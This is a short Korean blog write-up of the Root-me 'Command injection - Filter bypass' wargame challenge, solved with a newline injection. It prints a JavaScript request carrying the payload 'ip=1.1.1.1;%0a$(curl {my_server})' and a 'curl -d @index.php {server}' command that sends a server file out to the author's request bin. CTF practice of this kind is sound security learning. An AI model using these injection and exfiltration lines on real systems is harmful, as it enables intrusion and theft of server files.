---
title: Root-me Command injection Filter bypass (풀이 봄)
date: 2022-06-20-20:51  +0900
categories: [Wargame,Root-me]
tags: [command injection, new line, curl, curl post, post a file with curl, 풀이 봄]
---

## Command injection - Filter bypass (풀이 봄)
<hr style="border-top: 1px solid;"><br>

```
30 Points
Ping service v2
Author
sambecks,  20 September 2017

Statement
Find a vulnerability in this service and exploit it. Some protections were added.

The flag is on the index.php file.
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

풀이를 보니 new line을 이용하여 풀 수 있다고 한다. 

chrome 개발자 도구를 이용해 console에서 보내주었다.

<br>

```
c = new XMLHttpRequest();
c.open('POST','http://challenge01.root-me.org/web-serveur/ch53/index.php', true);
c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
c.send('ip=1.1.1.1;%0a$(curl {my_server})');
```

<br>

그러면 서버로 요청이 들어온 걸 알 수 있다.

서버는 드림핵 request bin을 이용하였고, post로 파일을 보내는 방법은 아래 주소에서 확인할 수 있다.
: <a href="https://reqbin.com/req/c-dot4w5a2/curl-post-file" target="_blank">reqbin.com/req/c-dot4w5a2/curl-post-file</a>

즉, POST로 파일을 전송할 때 ```curl -d @index.php {server}```로 해주면 된다는 것이다.

<br><br>
<hr style="border: 2px solid;">
<br><br>
